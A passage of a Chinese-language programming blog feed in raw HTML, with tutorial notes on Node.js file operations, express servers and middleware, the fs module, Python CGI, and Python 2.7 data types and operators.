class="string">&quot;启动服务器&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="pug模块"><a href="#pug模块" class="headerlink" title="pug模块"></a>pug模块</h2><h1 id="Node-js中的文件操作"><a href="#Node-js中的文件操作" class="headerlink" title="Node.js中的文件操作"></a>Node.js中的文件操作</h1><h2 id="文件读取与写入"><a href="#文件读取与写入" class="headerlink" title="文件读取与写入"></a>文件读取与写入</h2><table><thead><tr><th>文件名称</th><th>说明</th></tr></thead><tbody><tr><td>readFile(file,encoding,callback)</td><td>文件异步读取</td></tr><tr><td>readFileSync(file,encoding)</td><td>文件同步读取</td></tr><tr><td>writeFile(file,encoding,callback)</td><td>文件异步写入</td></tr><tr><td>writeFileSync(file,data,encoding)</td><td>文件同步写入</td></tr></tbody></table><p>同步读取文件，方法名具有Sync后缀，不具有Sync后缀均为异步方法，同步方法立即返回操作结果，在使用同步方法执行的操作结束前， 不能执行后续代码，</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="同步操作"><a href="#同步操作" class="headerlink" title="同步操作"></a>同步操作</h3><p>在使用同步方法进行文件操作时，可使用try-catch语句进行异常处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">···</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">console.log(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异步操作"><a href="#异步操作" class="headerlink" title="异步操作"></a>异步操作</h3><p>使用异步方法进行文件操作时，使用if-else语句进行异常处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fs.writeFile(&#x27;...txt&#x27;,data,&#x27;utf-8&#x27;,function(error,data)&#123;</span><br><span class="line">if(error)&#123;</span><br><span class="line">console.log(error);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">···</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="express模块"><a href="#express模块" class="headerlink" title="express模块"></a>express模块</h1><h2 id="通过express模块创建服务器"><a href="#通过express模块创建服务器" class="headerlink" title="通过express模块创建服务器"></a>通过express模块创建服务器</h2><p>使用express( )方法创建一个Web服务器，然后通过use( )方法，监听请求与响应事件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app=express();</span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">   res.writeHead(<span class="number">200</span>,&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br><span class="line">   res.end(<span class="string">&quot;&lt;h1&gt;hello,world&lt;/h1&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="number">2333</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器启动&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="express模块中的响应对象"><a href="#express模块中的响应对象" class="headerlink" title="express模块中的响应对象"></a>express模块中的响应对象</h2><p>使用模块创建对象后，express模块提供了request对象和response对象来完成客户端的请求操作和服务端的响应操作</p><table><thead><tr><th>方法名称</th><th>说明</th></tr></thead><tbody><tr><td>response.redirect([status,]path)</td><td>强制跳转到指定页面</td></tr><tr><td>response.send([body])</td><td>根据参数类型，返回对应数据</td></tr><tr><td>response.json([body])</td><td>返回json数据</td></tr><tr><td>response.jsonp</td><td>返回jsonp数据</td></tr></tbody></table><p>send()方法中的参数</p><table><thead><tr><th>数据类型</th><th>说明</th></tr></thead><tbody><tr><td>字符串</td><td>HTML</td></tr><tr><td>数组</td><td>JSON</td></tr><tr><td>对象</td><td>JSON</td></tr></tbody></table><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app=express();</span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">var</span> out=[];</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">       out.push(&#123;</span><br><span class="line">           <span class="attr">id</span>:i,</span><br><span class="line">           <span class="attr">name</span>:<span class="string">&quot;caixukun&quot;</span>+i</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">    res.send(out[<span class="number">1</span>].id+out[<span class="number">1</span>].name);</span><br><span class="line">&#125;).listen(<span class="number">2333</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器启动&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="express模块中的请求对象"><a href="#express模块中的请求对象" class="headerlink" title="express模块中的请求对象"></a>express模块中的请求对象</h2><p>express模块也使用了request对象，封装了客户端请求的属性和方法</p><p>request对象中的属性和方法</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>params</td><td>返回路由参数</td></tr><tr><td>query</td><td>返回请求变量</td></tr><tr><td>headrs</td><td>返回请求头信息</td></tr><tr><td>header( )</td><td>设置请求头信息</td></tr><tr><td>accepts(type)</td><td>判断请求accpet属性信息</td></tr><tr><td>is(type)</td><td>判断请求Content-Type属性信息</td></tr></tbody></table><p>输出浏览器的请求头：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app=express();</span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">var</span> agent=req.headers;</span><br><span class="line">   res.send(agent);</span><br><span class="line">&#125;).listen(<span class="number">2333</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器启动&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210308142848472.png" class="lazyload" data-srcset="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210308142848472.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308142848472"></p><h2 id="express模块中的中间块"><a href="#express模块中的中间块" class="headerlink" title="express模块中的中间块"></a>express模块中的中间块</h2><p>use( )方法中的参数是<code>function(request,response,next)&#123;&#125;</code>形式其中next表示一个函数，这个函数就可以称做为中间件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app=express();</span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;第一个use&quot;</span>)</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;第二个use&quot;</span>)</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;第三个use&quot;</span>)</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">2333</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器启动&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210308144036528.png" class="lazyload" data-srcset="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210308144036528.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308144036528"></p><p>express模块中常用的中间块</p><table><thead><tr><th>中间块名称</th><th>说明</th></tr></thead><tbody><tr><td>router</td><td>处理页面间的路由</td></tr><tr><td>static</td><td>托管静态文件，如图片、css文件和JavaScript文件</td></tr><tr><td>morgan</td><td>日志组件</td></tr><tr><td>cookie parser</td><td>处理cookie请求与响应</td></tr><tr><td>bady parser</td><td>对POST请求进行解析</td></tr><tr><td>content-multiparty</td><td>文件上传中间块</td></tr></tbody></table><h1 id="fs模块"><a href="#fs模块" class="headerlink" title="fs模块"></a>fs模块</h1><h2 id="判断是文件还是文件夹"><a href="#判断是文件还是文件夹" class="headerlink" title="判断是文件还是文件夹"></a>判断是文件还是文件夹</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.stat(<span class="string">&#x27;./tmp&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(error)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(error);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`是文件<span class="subst">$&#123;data.isFile()&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`是文件夹<span class="subst">$&#123;data.isDirectory()&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>通过使用fs.stat( )方法，然后返回的data进行判断</p><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p><code>fs.mkdir(路径，权限，回调函数(error)&#123;&#125;)</code></p><h2 id="创建、写入文件"><a href="#创建、写入文件" class="headerlink" title="创建、写入文件"></a>创建、写入文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var fs=require(&#x27;fs&#x27;);</span><br><span class="line">fs.writeFile(&#x27;./tmp/hello.txt&#x27;,&quot;hello world&quot;,function(error)&#123;</span><br><span class="line">    if(error)&#123;</span><br><span class="line">        console.log(error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> NodeJs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python CGI编程</title>
      <link href="/2021/03/06/Python/Python-CGI%E7%BC%96%E7%A8%8B/"/>
      <url>/2021/03/06/Python/Python-CGI%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-CGI-Common-Gateway-Interface-："><a href="#1-CGI-Common-Gateway-Interface-：" class="headerlink" title="1.CGI(Common Gateway Interface)："></a>1.CGI(Common Gateway Interface)：</h1><p>通用网关接口，它是一段程序，运行在服务器上如：HTTP 服务器，提供同客户端 HTML 页面的接口。</p><p><img src="/2021/03/06/Python/Python-CGI%E7%BC%96%E7%A8%8B/image-20210306162516513.png" class="lazyload" data-srcset="/2021/03/06/Python/Python-CGI%E7%BC%96%E7%A8%8B/image-20210306162516513.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306162516513"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python2.7语法规范</title>
      <link href="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/"/>
      <url>/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<h1 id="1-标准数据类型"><a href="#1-标准数据类型" class="headerlink" title="1.标准数据类型"></a>1.标准数据类型</h1><p>Python有五个标准的数据类型：</p><h3 id="1-Numbers（数字）"><a href="#1-Numbers（数字）" class="headerlink" title="1.Numbers（数字）"></a>1.Numbers（数字）</h3><p>Python支持四种不同的数字类型：</p><ul><li>int（有符号整型）</li><li>long（长整型[也可以代表八进制和十六进制]）</li><li>float（浮点型）</li><li>complex（复数）</li></ul><h3 id="2-String（字符串）"><a href="#2-String（字符串）" class="headerlink" title="2.String（字符串）"></a>2.String（字符串）</h3><h3 id="3-List（列表）"><a href="#3-List（列表）" class="headerlink" title="3.List（列表）"></a>3.List（列表）</h3><p>列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（即嵌套）。列表中值的切割也可以用到变量 <strong>[头下标:尾下标]</strong> ，就可以截取相应的列表，从左到右索引默认 0 开始，从右到左索引默认 -1 开始，下标可以为空表示取到头或尾。</p><img src="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210305190050955.png" class="lazyload" data-srcset="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210305190050955.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210305190050955" style="zoom:50%;"><h3 id="4-Tuple（元组）"><a href="#4-Tuple（元组）" class="headerlink" title="4.Tuple（元组）"></a>4.Tuple（元组）</h3><p>元组是另一个数据类型，类似于 List（列表）。元组用 <strong>()</strong> 标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于<strong>只读</strong>列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">tuple</span> = ( <span class="string">&#x27;nowcoder&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;john&#x27;</span>, <span class="number">70.2</span> )</span><br><span class="line"><span class="built_in">list</span> = [ <span class="string">&#x27;nowcoder&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;john&#x27;</span>, <span class="number">70.2</span> ]</span><br><span class="line"><span class="built_in">tuple</span>[<span class="number">2</span>] = <span class="number">1000</span>    <span class="comment"># 元组中是非法应用</span></span><br><span class="line"><span class="built_in">list</span>[<span class="number">2</span>] = <span class="number">1000</span>     <span class="comment"># 列表中是合法应用</span></span><br></pre></td></tr></table></figure><h3 id="5-Dictionary（字典）"><a href="#5-Dictionary（字典）" class="headerlink" title="5.Dictionary（字典）"></a>5.Dictionary（字典）</h3><p>字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象集合，字典是无序的对象集合。</p><p>两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典用”{ }”标识。字典由索引(key)和它对应的值value组成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>] = <span class="string">&quot;This is one&quot;</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="number">2</span>] = <span class="string">&quot;This is two&quot;</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;john&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="number">6734</span>, <span class="string">&#x27;dept&#x27;</span>: <span class="string">&#x27;sales&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>]          <span class="comment"># 输出键为&#x27;one&#x27; 的值</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="number">2</span>]              <span class="comment"># 输出键为 2 的值</span></span><br><span class="line"><span class="built_in">print</span> tinydict             <span class="comment"># 输出完整的字典</span></span><br><span class="line"><span class="built_in">print</span> tinydict.keys()      <span class="comment"># 输出所有键</span></span><br><span class="line"><span class="built_in">print</span> tinydict.values()    <span class="comment"># 输出所有值</span></span><br></pre></td></tr></table></figure><p>输出结果：<img src="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210305190339451.png" class="lazyload" data-srcset="/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/image-20210305190339451.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210305190339451" style="zoom:50%;"></p><h3 id="6-Python数据类型转换"><a href="#6-Python数据类型转换" class="headerlink" title="6.Python数据类型转换"></a>6.Python数据类型转换</h3><table><thead><tr><th align="center">函数</th><th align="center">描述</th><th></th></tr></thead><tbody><tr><td align="center">int(x,base)</td><td align="center">将x转换为一个整数，base代表进制，如果不是缺省，则x为字符串</td><td>int(3.6) int(‘12’,16)</td></tr><tr><td align="center">long(x,base)</td><td align="center">将x转换为一个长整数</td><td></td></tr><tr><td align="center">float(x)</td><td align="center">将x转换到一个浮点数</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/032f82662798424c847a790923b9718c">str(x)</a></td><td align="center">将对象 x 转换为字符串</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/407dd372a87c4f00a8fdd44a73ea0718">repr(x)</a></td><td align="center">将对象 x 转换为表达式字符串</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/a9496e991c744498b6657a0e26f2efc7">eval(str)</a></td><td align="center">用来计算在字符串中的有效Python表达式,并返回一个对象</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/c7308a80133d43699c84191bd64587b9">tuple(s)</a></td><td align="center">将序列 s 转换为一个元组</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/8c46b558c8c24b55bb17a53a7dcda843">list(s)</a></td><td align="center">将序列 s 转换为一个列表</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/dcabaef8a0f94a6284a2adc6e89e6536">set(s)</a></td><td align="center">转换为可变集合</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/faf909f6a1e94312ac62bc28fd728c1e">dict(d)</a></td><td align="center">创建一个字典。d 必须是一个序列 (key,value)元组。</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/2329aba25ddf4c27987ee13e2b0ca302">frozenset(s)</a></td><td align="center">转换为不可变集合</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/30ceb088771448aa8aecd3309244b051">chr(x)</a></td><td align="center">将一个整数转换为一个字符</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/cd64193854a14f6a985470906da05ae8">unichr(x)</a></td><td align="center">将一个整数转换为Unicode字符</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/6d847059ca8844c3ae0927135edd95f5">ord(x)</a></td><td align="center">将一个字符转换为它的整数值</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/c9c4f377f0dd4920845a2093d59e5988">hex(x)</a></td><td align="center">将一个整数转换为一个十六进制字符串</td><td></td></tr><tr><td align="center"><a href="https://www.nowcoder.com/tutorial/10004/13b08951193a48ccbd5940625215094d">oct(x)</a></td><td align="center">将一个整数转换为一个八进制字符串</td><td></td></tr></tbody></table><h1 id="2-Python运算符"><a href="#2-Python运算符" class="headerlink" title="2.Python运算符"></a>2.Python运算符</h1><h3 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符"></a>1.算术运算符</h3><h3 id="2-比较（关系）运算符"><a href="#2-比较（关系）运算符" class="headerlink" title="2.比较（关系）运算符"></a>2.比较（关系）运算符</h3><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于 - 比较对象是否相等</td><td align="center">(a == b) 返回 False。</td></tr><tr><td align="center">!=</td><td align="center">不等于 - 比较两个对象是否不相等</td><td align="center">(a != b) 返回 true.</td></tr><tr><td align="center">&lt;&gt;</td><td align="center"><strong>不等于 - 比较两个对象是否不相等</strong></td><td align="center">(a &lt;&gt; b) 返回 true。这个运算符类似 != 。</td></tr><tr><td align="center">&gt;</td><td align="center">大于 - 返回x是否大于y</td><td align="center">(a &gt; b) 返回 False。</td></tr><tr><td align="center">&lt;</td><td align="center">小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。</td><td align="center">(a &lt; b) 返回 true。</td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于 - 返回x是否大于等于y。</td><td align="center">(a &gt;= b) 返回 False。</td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于 - 返回x是否小于等于y。</td><td align="center">(a &lt;= b) 返回 true。</td></tr></tbody></table><h3 id="3-赋值运算符"><a href="#3-赋值运算符" class="headerlink" title="3.赋值运算符"></a>3.赋值运算符</h3><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">=</td><td align="center">简单的赋值运算符</td><td align="center">c = a + b 将 a + b 的运算结果赋值为 c</td></tr><tr><td align="center">+=</td><td align="center">加法赋值运算符</td><td align="center">c += a 等效于 c = c + a</td></tr><tr><td align="center">-=</td><td align="center">减法赋值运算符</td><td align="center">c -= a 等效于 c = c - a</td></tr><tr><td align="center">*=</td><td align="center">乘法赋值运算符</td><td align="center">c *= a 等效于 c = c * a</td></tr><tr><td align="center">/=</td><td align="center">除法赋值运算符</td><td align="center">c /= a 等效于 c = c / a</td></tr><tr><td align="center">%=</td><td align="center">取模赋值运算符</td><td align="center">c %= a 等效于 c = c % a</td></tr><tr><td align="center">**=</td><td align="center">幂赋值运算符</td><td align="center">c **= a 等效于 c = c ** a</td></tr><tr><td align="center">//=</td><td align="center">取整除赋值运算符</td><td align="center">c //= a 等效于 c = c // a</td></tr></tbody></table><h3 id="4-逻辑运算符"><a href="#4-逻辑运算符" class="headerlink" title="4.逻辑运算符"></a>4.逻辑运算符</h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p><table><thead><tr><th align="center">运算符</th><th align="center">逻辑表达式</th><th align="center">描述</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">x and y</td><td align="center">布尔”与” - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。</td><td align="center">(a and b) 返回 20。</td></tr><tr><td align="center">or</td><td align="center">x or y</td><td align="center">布尔”或” - 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。</td><td align="center">(a or b) 返回 10。</td></tr><tr><td align="center">not</td><td align="center">not x</td><td align="center">布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td><td align="center">not(a and b) 返回 False</td></tr></tbody></table><h3 id="5-位运算符"><a href="#5-位运算符" class="headerlink" title="5.位运算符"></a>5.位运算符</h3><h3 id="6-成员运算符"><a href="#6-成员运算符" class="headerlink" title="6.成员运算符"></a>6.成员运算符</h3><h3 id="7-身份运算符"><a href="#7-身份运算符" class="headerlink" title="7.身份运算符"></a>7.身份运算符</h3><h3 id="8-运算符优先级"><a href="#8-运算符优先级" class="headerlink" title="8.运算符优先级"></a>8.运算符优先级</h3><h1 id="3-Python随机函数"><a href="#3-Python随机函数" class="headerlink" title="3.Python随机函数"></a>3.Python随机函数</h1><p>Python包含以下常用随机数函数：</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">choice(seq)</td><td align="center">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。</td></tr><tr><td align="center">randrange (start,stop,step)</td><td align="center">从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1，step为递增增量</td></tr><tr><td align="center">random()</td><td align="center">随机生成下一个实数，它在[0,1)范围内。</td></tr><tr><td align="center">seed([x])</td><td align="center">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</td></tr><tr><td align="center">shuffle(lst)</td><td align="center">将序列的所有元素随机排序</td></tr><tr><td align="center">uniform(x, y)</td><td align="center">随机生成下一个实数，它在[x,y]范围内。</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> 